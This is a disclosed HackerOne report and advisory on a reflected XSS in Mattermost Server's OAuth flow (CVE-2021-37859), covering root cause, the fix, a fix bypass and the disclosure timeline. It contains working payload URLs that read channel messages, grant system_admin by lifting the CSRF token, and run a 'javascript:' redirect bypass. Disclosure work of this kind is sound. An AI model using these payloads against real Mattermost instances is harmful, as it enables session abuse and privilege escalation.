---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
date: 2021-08-06
submitted: 2021-06-03T08:56:19.005Z
bounty_usd: 900
votes: 44
cve: "CVE-2021-37859"
program: "[[programs/mattermost|Mattermost]]"
reporter: "shielder"
source: "https://hackerone.com/reports/1216203"
title: "Mattermost Server OAuth Flow Cross-Site Scripting"
---
# Mattermost Server OAuth Flow Cross-Site Scripting

> **Severity:** High | **Bounty:** 900 USD | **Votes:** 44 | **Program:** Mattermost | **Disclosed:** 2021-08-06

- Report: [https://hackerone.com/reports/1216203](https://hackerone.com/reports/1216203)
- CWE: Cross-site Scripting (XSS) - Reflected | CVE: CVE-2021-37859
- Submitted: 2021-06-03T08:56:19.005Z

## Report summary

[Andrea \`zi0black\` Cappa](https://twitter.com/zi0black) of [Shielder](https://twitter.com/ShielderSec) found a Reflected Cross-Site Scripting (XSS) in the OAuth authentication flow of Mattermost. Once fixed he found a bypass for it which was promptly fixed by the Mattermost team.

The vulnerability could have been abused to hijack a victim session and based on their privileges steal their conversations / send messages (user) and/or add a new administrator on the Mattermost instance (admin).

All the details are available in the advisory published on Shielder's website: https://www.shielder.it/advisories/mattermost-server-reflected-xss-oauth/

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-06-07** @rohitesh_mattermost: Hi @shielder 

Although I am able to reproduce the issue and agree that this needs to be fixed, I do not agree with the severity of the ticket and the impact specified in the report, just because the session cookies can still not be stolen. For example, if you visit the URL to alert the session cookies, you will notice that it does not displays the session cookies:

`https://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror=alert(document.cookies)%3E`

Please let me know if you are able to showcase the impact (mentioned above in your report) as a POC.
- **2021-06-07** @shielder: Hi @rohitesh_mattermost,
Your statement is correct; it is not possible to directly steal the session cookie as it is set to httpOnly, meaning JavaScript can't access it.
That said, the browser would still send its content along with XHR requests; this means that an attacker could act as the victim by abusing their browser.
We built two PoC assuming the victim is, in the first instance, a regular user and, in the second one, an administrator.
For simplicity, we made some assumptions in the PoC, and they require to know the `user_id` and the `channel_id`. In a real attack scenario, they could be easily retrieved via JavaScript too. If you need the complete PoC retrieving them, too, let us know so we can build it.

## PoC 1 (regular user)
In this PoC, the attacker reads the latest messages in a given channel. The output is shown as the content of an `alert()` but could be sent to an attacker-controlled server in a real-world scenario.

1. Visit the following URL by replacing `<mattermost_url>` target MatterMost instance domain / IP, `<user_id>` with the victim's user_id, and `<channel_id>` with the channel_id you want to read messages of:
`http://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror="var xhr = new XMLHttpRequest()%3bxhr.open('GET', '/api/v4/users/<user_id>/channels/<channel_id>/posts/unread?limit_after=30', true)%3bxhr.withCredentials = true%3bxhr.send(null)%3balert(xhr.responseText)%3b"%3E`
2. Notice the pop-up containing the latest message of the chosen channel

## PoC 2 (admin)
In this PoC, the attacker sends to an administrator the malicious link, which, when visited, would change the role of the attacker's user to `system_admin`.

1. Visit the following URL with an admin by replacing `<mattermost_url>` target MatterMost instance domain / IP and `<user_id>` with the user you want to promote to `system_admin`:
`http://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror="var xhr = new XMLHttpRequest()%3bxhr.open('PUT', '/api/v4/users/<user_id>/roles', true)%3bxhr.withCredentials = true%3bxhr.setRequestHeader('X-CSRF-Token', document.cookie.match(new RegExp('(^| )'%2b'MMCSRF'%2b'=([^%3b]%2b)'))[2])%3bxhr.send(JSON.stringify('{\'roles\':\'system_user system_admin\'}'))%3b"%3E`
2. Login with the account whose `user_id` has been used in step 1
3. Notice that the user is now an administrator (this could be verified by visiting `/admin_console/user_management/users`)

We hope this is clear and easy to reproduce; please let us know if you have any problems.

Best,
Shielder
- **2021-06-07** @rohitesh_mattermost: Thanks for sharing the POC @shielder. Appreciate it. Please stay tuned.
- **Report Severity Updated**
- **2021-06-15** @shielder: Hi @rohitesh_mattermost,
we saw you worked on a fix [here](https://github.com/mattermost/mattermost-server/pull/17743), which should be ready for 5.36.

The fix correctly encodes the `redirect_to` parameter using the `html.EscapeString` function, which prevents its content to escape the `href` attribute and to inject new attributes/tags.

```go
redirectURL := html.EscapeString(r.URL.Query().Get("redirect_to"))
```

On the other hand no validation is performed on the `redirect_to` parameter, meaning that it is possible to set as `href` a `javascript:` URI, which would execute arbitrary JavaScript code when clicked.

While we know that community.mattermost.com is not already fixed we built a PoC for it anyway which should be able to bypass the new checks, so you can reproduce it on the "fixed" version too:
1. Visit https://community.mattermost.com/oauth/test/mobile_login?redirect_to=javascript:alert(document.domain)
2. Click on "Back to Mattermost"
3. Notice that the following JavaScript code is executed: `alert(document.cookie)`

We hope that this day -1 ™️ bypass is appreciated and could help you in better fixing the vulnerability before the public release :)

Best,
Shielder
- **2021-06-16** @rohitesh_mattermost: Hi @shielder 

Thanks for chiming in early and evaluating the fix. Much appreciated. I have communicated the same to the team and they will be working on a fix soon for the bypass.
- **Report Severity Updated**
- **2021-06-16** @juho_nurminen: Hi @shielder,

Thanks again for the work here. We have a patch for the bypass at https://github.com/mattermost/mattermost-server/pull/17789, just pending a few reviews. I'll resolve the ticket once the fix lands. In the meantime, enjoy your bounty and a small bonus for the bypass :)

Regards,

Juho Nurminen
- **Bounty Awarded**
- **Swag Awarded**
- **2021-06-16** @shielder: Hi @juho_nurminen,
thanks for the update and the bounty! Also the bonus was really appreciated :)

I hope the fixed release will be published soon, so we can update our instance too ;)

Best,
Shielder
- **2021-07-13** @shielder: Hi @juho_nurminen,
we want to ask you two things:
- we saw that some details about this vuln as been shared on this page https://mattermost.com/security-updates/. Is it possible to change "Thanks to shielder" to "Thanks to Andrea `zi0Black` Cappa of Shielder"? :)
- we are planning to publish the advisory about this vulnerability on our company website on 26 of July. Is there any problem with this date, or can we go ahead with our schedule?

Best,
Shielder
- **2021-07-15** @rohitesh_mattermost: Hi @shielder 

>  Is it possible to change "Thanks to shielder" to "Thanks to Andrea zi0Black Cappa of Shielder"?

Sure, I will inform the team and get this changed. 

 > we are planning to publish the advisory about this vulnerability on our company website on 26 of July. Is there any problem with this date, or can we go ahead with our schedule?

Should be fine. But can you please share us a draft copy of this advisory before publishing it, so that we can review it once.
- **2021-07-15** @shielder: Hi @rohitesh_mattermost,
Sure, in the next few days, we will share the advisory when ready.

Best,
Shielder
- **Report Resolved**
- **2021-07-23** @shielder: Hi @rohitesh_mattermost, as you asked, I'm sharing the advisory before publishing it (the publish is scheduled for 26/07).

I have to ask you if you can provide us the CVE/CVEs for this vulnerability? to insert it in the advisory in the first instance without updating it later; thanks.

# Mattermost Server v5.32 > v5.36 Reflected XSS in OAuth flow

## Summary
The OAuth flow implemented in Mattermost server v5.32 > v5.36 is affected by a reflected XSS. An unauthenticated attacker might gain access to the victim's session.

## Product description (from vendor)
"Mattermost is an open-source, self-hosted Slack-alternative. As an alternative to proprietary SaaS messaging, Mattermost brings all your team communication into one place, making it searchable and accessible anywhere."

For more information, visit https://mattermost.org/about/.

## CVE(s)
- CVE-2021-TBA (MMSA-2021-0055)

## Details

### Root cause analysis
The application fails to sanitize an HTTP query parameter before reflecting it within the HTML response during the OAuth flow.

```go=280
        if props != nil {
                action = props["action"]
                isMobile = action == model.OAUTH_ACTION_MOBILE
                if val, ok := props["redirect_to"]; ok {
[1]                     redirectURL = val
                        hasRedirectURL = redirectURL != ""
                }
        }
        renderError := func(err *model.AppError) {
                if isMobile && hasRedirectURL {
[2]                     utils.RenderMobileError(c.App.Config(), w, err, redirectURL)
                } else {
                        utils.RenderWebAppError(c.App.Config(), w, r, err, c.App.AsymmetricSigningKey())
                }
        }
```

The file "/web/oauth.go" (https://github.com/mattermost/mattermost-server/blob/master/web/oauth.go) contains the function "completeOAuth" which on line 284 values the variable "redirectURL" with the parameter "redirect_to" [1] of the query string of the HTTP GET request. At line 291 the function "utils.RenderMobileError" is called, with "redirectURL" [2] as parameter.

```go=103
func RenderMobileError(config *model.Config, w http.ResponseWriter, err *model.AppError, redirectURL string) {
        RenderMobileMessage(w, `
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" style="width: 64px; height: 64px; fill: #ccc">
                        <!-- Font Awesome Free 5.15.3 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) -->
                        <path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/>
                </svg>
                <h2> `+i18n.T("error")+` </h2>
                <p> `+err.Message+` </p>
[1]                <a href="`+redirectURL+`">
                        `+i18n.T("api.back_to_app", map[string]interface{}{"SiteName": config.TeamSettings.SiteName})+`
                </a>
        `)
}
```

The function "RenderMobileError" is contained within the file [utils/api.go](https://github.com/mattermost/mattermost-server/blob/master/utils/api.go) at line 103, and the fourth argument of this function is "redirectURL". At line 104 the "RenderMobileMessage" function is called and at line 111 the variable "redirectURL" is concatenated (without any modification) with another string argument of the "RenderMobileMessage" function [1].

```go=157
[...]
                        </head>
                        <body>
                                <!-- mobile app message -->
                                <div class="message-container">
[1]                                     `+message+`
                                </div>
                        </body>
                </html>
        `)
```

Inside the "RenderMobileMessage" function (declared at line 117 of utils/api.go) "fmt.Fprintln" is called to print the HTTP response and the HTML page is dynamically built concatenating the "message" variable [1] (second argument of the function).


Since the HTTP GET request parameter "redirect_to" is never sanitized and is appended to the HTML page, it is possible to trigger a reflected XSS.

### Proof of concept
#### PoC 1 (regular user)

In this PoC, the attacker reads the latest messages in a given channel. The output is shown as the content of an `alert()` but could be sent to an attacker-controlled server in a real-world scenario.

1. Visit the following URL by replacing `<mattermost_url>` target MatterMost instance domain / IP, `<user_id>` with the victim's user_id, and `<channel_id>` with the channel_id you want to read messages of:
   `http://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror="var xhr = new XMLHttpRequest()%3bxhr.open('GET', '/api/v4/users/<user_id>/channels/<channel_id>/posts/unread?limit_after=30', true)%3bxhr.withCredentials = true%3bxhr.send(null)%3balert(xhr.responseText)%3b"%3E`
2. Notice the pop-up containing the latest message of the chosen channel

#### PoC 2 (admin)

In this PoC, the attacker sends to an administrator the malicious link, which, when visited, would change the role of the attacker's user to `system_admin`.

1. Visit the following URL with an admin by replacing `<mattermost_url>` target MatterMost instance domain / IP and `<user_id>` with the user you want to promote to `system_admin`:
   `http://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror="var xhr = new XMLHttpRequest()%3bxhr.open('PUT', '/api/v4/users/<user_id>/roles', true)%3bxhr.withCredentials = true%3bxhr.setRequestHeader('X-CSRF-Token', document.cookie.match(new RegExp('(^| )'%2b'MMCSRF'%2b'=([^%3b]%2b)'))[2])%3bxhr.send(JSON.stringify('{\'roles\':\'system_user system_admin\'}'))%3b"%3E`
2. Login with the account whose `user_id` has been used in step 1
3. Notice that the user is now an administrator (this could be verified by visiting `/admin_console/user_management/users`)

### Impact
An unauthenticated attacker might gain access to a privileged user session.

### Remediation
Upgrade Mattermost Server to version v5.34.5, v5.35.4, v5.36.1, and v5.37.0 or higher.

## Disclosure timeline
This report was subject to Shielder's [disclosure policy](/disclosure-policy):
* 03/06/2021: The vulnerability is reported to Mattermost via their public bug bounty program on [Hackerone](https://hackerone.com/mattermost)
* 07/06/2021: 
    * Mattermost acknowledges the issue
    * Mattermost requires additional PoC to prove the impact
    * Shielder and Mattermost agree on the impact of the vulnerability
* 16/06/2021: 
    * Shielder reports a bypass for the fix (v5.36)
    * Mattermost acknowledges bypass
    * Mattermost rewards Shielder, including a bonus for the bypass
* 21/07/2021: Mattermost releases v5.36.1 with a patch
* 26/07/2021: Shielder's advisory is made public

## Credits
\`[zi0Black](https://twitter.com/zi0Black)\` of Shielder
- **2021-07-23** @rohitesh_mattermost: Hi @shielder 

Thanks for sharing the security advisory. I am getting this reviewed internally and will confirm you soon. Just a quick observation:

- In the timelines, the patch 5.36.1 was created on 21st June and not on 21st July. Please check the [release here](https://github.com/mattermost/mattermost-server/releases/tag/v5.36.1)
- **2021-07-23** @rohitesh_mattermost: Hi @shielder 

The content of the security advisory looks great, apart from the change suggested previously. And with regards to the CVE, we do not have a CVE ID for this issue. We only have the MMSA ID to uniquely identify this issue, which you have already included in the advisory. Thanks. 

Best regards and happy hunting!
- **2021-07-23** @shielder: Thank you for the feedback. It was a pleasure working with you.

Cheers,
Shielder
- **Agreed On Going Public**
- **2021-07-27** @shielder: Hi @rohitesh_mattermost,
One last thing, we checked with the MITRE and they told us the CVE ID should be issued by you as you are a CNA (https://cve.mitre.org/cve/request_id.html).
Can you kindly assign a CVE ID to this bug, so it can be easily referenced?

Cheers,
Shielder
- **2021-07-27** @rohitesh_mattermost: Hi @shielder 
Sure, let me check and get back to you on this. Please note that this might take some time, so please stay tuned.
- **2021-08-03** @rohitesh_mattermost: Hi @shielder 

We have assigned the CVE `CVE-2021-37859` for this report. We have submitted all the requested information and are awaiting a confirmation. We will let you know once it goes public. Congratulations!!!

Best regards and happy hunting!
- **Cve Id Added**
- **2021-08-03** @shielder: Hi @rohitesh_mattermost,
Great to hear that! We will add the CVE in our advisory too. I think we now have everything to go public here, correct?

Cheers,
Shielder
- **Agreed On Going Public**
- **Report Became Public**
